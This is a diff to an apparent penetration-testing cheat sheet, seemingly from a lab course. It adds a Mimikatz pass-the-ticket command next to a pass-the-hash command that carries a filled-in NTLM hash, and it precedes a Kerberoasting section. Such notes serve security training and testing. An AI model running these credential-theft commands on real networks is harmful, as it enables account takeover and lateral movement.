@@ -179,6 +179,13 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<nt
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
 ```
 
+#### Pass the ticket
+
+```powershell
+Invoke-Mimikatz -Command '"kerberos::ptt C:\test\krb_tkt.kirbi"'
+```
+
+
 #### Kerberoast
 
 Get Kerberos ticket for user with SPN
